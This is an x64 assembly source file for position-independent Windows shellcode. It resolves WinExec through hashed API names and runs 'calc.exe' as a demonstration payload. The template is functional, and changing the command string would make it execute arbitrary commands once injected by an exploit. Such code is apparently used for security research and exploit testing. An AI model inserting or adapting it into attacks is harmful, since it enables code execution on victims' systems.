[ORG 0]
[BITS 64]

entry:
  ; store context
  push rbx                              ; store rbx
  push rbp                              ; store rbp
  mov rbp, rsp                          ; create new stack frame
  and rsp, 0xFFFFFFFFFFFFFFF0           ; ensure stack is 16 bytes aligned

  ; calculate entry address
  call calc_entry_addr                  ; calculate the entry address
  flag_CEA:                             ; flag for calculate entry address

  ; find "kernel32.dll, WinExec"
  cld                                   ; clear the direction flag
  mov rcx, 0x9BAC085EFA4FDFAE           ; set module name hash
  mov rdx, 0x221840B185A6EC3D           ; set procedure name hash
  mov r8,  0xCAF4D6F05577E596           ; set hash key
  call find_api                         ; try to find api address
  test rax, rax                         ; check target function is found
  jz not_found                          ;

  ; call "kernel32.dll, WinExec"
  lea rcx, [rbx+cmd_line]               ; lpCmdLine
  xor rdx, rdx                          ; clear rdx
  mov dl, [rbx+cmd_show]                ; uCmdShow
  sub rsp, 32                           ; reserve stack
  call rax                              ; call api function
  add rsp, 32                           ; restore stack

 not_found:
  ; restore context
  mov rsp, rbp                          ; restore stack
  pop rbp                               ; restore rbp
  pop rbx                               ; restore rbx
  ret                                   ; return to the caller

; calculate shellcode entry address
calc_entry_addr:
  pop rax                               ; get return address
  lea rbx, [rax-flag_CEA]               ; calculate entry address
  push rax                              ; push return address
  ret                                   ; return to entry

hash_api:
  %include "src/x64/find_api.asm"

cmd_line:
  db "calc.exe", 0

cmd_show:
  db 1
